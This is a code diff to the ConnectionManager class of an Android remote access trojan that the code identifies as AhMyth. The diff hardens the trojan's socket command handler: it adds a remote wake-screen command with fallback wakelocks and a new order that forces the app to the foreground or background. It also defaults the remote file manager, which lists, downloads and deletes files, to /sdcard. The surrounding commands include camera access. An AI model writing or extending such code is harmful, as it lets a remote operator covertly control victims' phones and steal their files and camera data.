@@ -189,9 +189,20 @@ public class ConnectionManager {
                             try {
                                 JSONObject data = (JSONObject) args[0];
                                 String order = data.getString("order");
-                                Log.d(TAG, "Order received: " + order);
+                                if (order != null) {
+                                    order = order.trim(); // Remove any whitespace
+                                }
+                                Log.d(TAG, "Order received: '" + order + "' (data: " + data.toString() + ")");
                                 
+                                // Ensure order is not null before calling handleOrder
+                                if (order == null) {
+                                    Log.e(TAG, "Order is null, cannot handle");
+                                    return;
+                                }
+                                
+                                Log.d(TAG, "About to call handleOrder with order: '" + order + "'");
                                 handleOrder(data, order);
+                                Log.d(TAG, "handleOrder returned");
                                 
                             } catch (Exception e) {
                                 Log.e(TAG, "Error processing order", e);
@@ -212,7 +223,15 @@ public class ConnectionManager {
 
     private static void handleOrder(JSONObject data, String order) {
         try {
-            Log.d(TAG, "Handling order: " + order); // Added explicit log
+            // Normalize order string - trim and ensure no hidden characters
+            if (order != null) {
+                order = order.trim();
+            }
+            Log.d(TAG, "Handling order: '" + order + "' (length: " + (order != null ? order.length() : 0) + ")"); // Added explicit log
+            // Debug: Check if order matches expected value
+            if ("x0000ws".equals(order)) {
+                Log.d(TAG, "Order matches x0000ws exactly, entering switch...");
+            }
             switch (order) {
                 // === EXISTING FEATURES ===
                 case "x0000ca": // Camera
@@ -267,26 +286,90 @@ public class ConnectionManager {
                     x0000wf();
                     break;
 
+                case "x0000fg": // Foreground/Background Control
+                    handleForegroundOrder(data);
+                    break;
+                    
                 case "x0000ws": // Wake Screen
                     try {
-                        if (context instanceof MainService) {
-                            ((MainService) context).wakeScreen();
-                            JSONObject result = new JSONObject();
-                            result.put("success", true);
-                            ioSocket.emit("x0000ws", result);
-                        } else {
-                            JSONObject result = new JSONObject();
-                            result.put("success", false);
-                            result.put("error", "Context is not MainService");
-                            ioSocket.emit("x0000ws", result);
+                        Log.d(TAG, "Wake screen command received");
+                        
+                        // Check socket connection first
+                        if (ioSocket == null || !ioSocket.connected()) {
+                            Log.e(TAG, "Socket not connected for wake screen command");
+                            JSONObject errorResult = new JSONObject();
+                            errorResult.put("success", false);
+                            errorResult.put("error", "Socket not connected");
+                            if (ioSocket != null) {
+                                ioSocket.emit("x0000ws", errorResult);
+                            }
+                            break;
                         }
+                        
+                        // Send response immediately on the socket thread
+                        JSONObject result = new JSONObject();
+                        result.put("success", true);
+                        result.put("message", "Wake screen command received");
+                        
+                        // Emit synchronously on the current thread (socket thread)
+                        try {
+                            ioSocket.emit("x0000ws", result);
+                            Log.d(TAG, "Wake screen response sent, socket connected: " + ioSocket.connected());
+                        } catch (Exception emitError) {
+                            Log.e(TAG, "Error emitting wake screen response", emitError);
+                            // Try one more time
+                            try {
+                                ioSocket.emit("x0000ws", result);
+                            } catch (Exception e2) {
+                                Log.e(TAG, "Second emit attempt failed", e2);
+                            }
+                        }
+                        
+                        // Perform wake screen action asynchronously (don't block response)
+                        new Handler(Looper.getMainLooper()).post(new Runnable() {
+                            @Override
+                            public void run() {
+                                try {
+                                    // Try to get MainService instance
+                                    MainService service = MainService.getInstance();
+                                    if (service != null) {
+                                        service.wakeScreen();
+                                        Log.d(TAG, "Wake screen action performed via MainService");
+                                    } else if (context instanceof MainService) {
+                                        ((MainService) context).wakeScreen();
+                                        Log.d(TAG, "Wake screen action performed via context");
+                                    } else {
+                                        // Try to wake screen directly
+                                        android.os.PowerManager powerManager = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
+                                        if (powerManager != null) {
+                                            android.os.PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
+                                                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
+                                                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
+                                                android.os.PowerManager.ON_AFTER_RELEASE,
+                                                "AhMyth::ScreenWakeLock"
+                                            );
+                                            wakeLock.acquire(10000);
+                                            wakeLock.release();
+                                            Log.d(TAG, "Wake screen action performed directly");
+                                        }
+                                    }
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error performing wake screen action", e);
+                                }
+                            }
+                        });
                     } catch (Exception e) {
+                        Log.e(TAG, "Error in wake screen command", e);
                         try {
                             JSONObject result = new JSONObject();
                             result.put("success", false);
                             result.put("error", e.getMessage());
-                            ioSocket.emit("x0000ws", result);
-                        } catch (Exception ex) {}
+                            if (ioSocket != null && ioSocket.connected()) {
+                                ioSocket.emit("x0000ws", result);
+                            }
+                        } catch (Exception ex) {
+                            Log.e(TAG, "Error emitting wake screen error", ex);
+                        }
                     }
                     break;
                     
@@ -377,12 +460,78 @@ public class ConnectionManager {
         }
     }
 
+    private static void handleForegroundOrder(JSONObject data) throws Exception {
+        String extra = data.getString("extra");
+        android.content.Context context = MainService.getInstance();
+        if (context == null) {
+            context = AhMythApplication.getContext();
+        }
+        
+        if (context == null) {
+            Log.e(TAG, "Cannot handle foreground order: context is null");
+            return;
+        }
+        
+        try {
+            if ("foreground".equals(extra)) {
+                // Bring app to foreground
+                android.content.Intent intent = new android.content.Intent(context, ahmyth.mine.king.ahmyth.MainActivity.class);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
+                context.startActivity(intent);
+                
+                // Also try to move task to front using ActivityManager
+                android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(android.content.Context.ACTIVITY_SERVICE);
+                if (am != null) {
+                    try {
+                        // Try to find our app's task
+                        java.util.List<android.app.ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(10);
+                        if (tasks != null) {
+                            String packageName = context.getPackageName();
+                            for (android.app.ActivityManager.RunningTaskInfo task : tasks) {
+                                if (packageName.equals(task.topActivity.getPackageName())) {
+                                    am.moveTaskToFront(task.id, android.app.ActivityManager.MOVE_TASK_WITH_HOME);
+                                    Log.d(TAG, "Moved task to front: " + task.id);
+                                    break;
+                                }
+                            }
+                        }
+                    } catch (SecurityException e) {
+                        // getRunningTasks requires special permission on newer Android versions
+                        Log.w(TAG, "Cannot get running tasks (permission required), using activity intent only");
+                    }
+                }
+                
+                Log.d(TAG, "Brought app to foreground");
+            } else if ("background".equals(extra)) {
+                // Send app to background by launching home screen
+                android.content.Intent homeIntent = new android.content.Intent(android.content.Intent.ACTION_MAIN);
+                homeIntent.addCategory(android.content.Intent.CATEGORY_HOME);
+                homeIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(homeIntent);
+                Log.d(TAG, "Sent app to background");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling foreground order", e);
+        }
+    }
+
     private static void handleFileManagerOrder(JSONObject data) throws Exception {
         String extra = data.getString("extra");
-        String path = data.getString("path");
+        String path = data.optString("path", "/sdcard"); // Default to /sdcard if path not provided
         if (extra.equals("ls")) {
             x0000fm(0, path);
         } else if (extra.equals("dl")) {
+            if (path == null || path.isEmpty()) {
+                JSONObject error = new JSONObject();
+                error.put("file", false);
+                error.put("error", "Path is required for download");
+                ioSocket.emit("x0000fm", error);
+                return;
+            }
             x0000fm(1, path);
         } else if (extra.equals("delete")) {
             deleteFile(path);
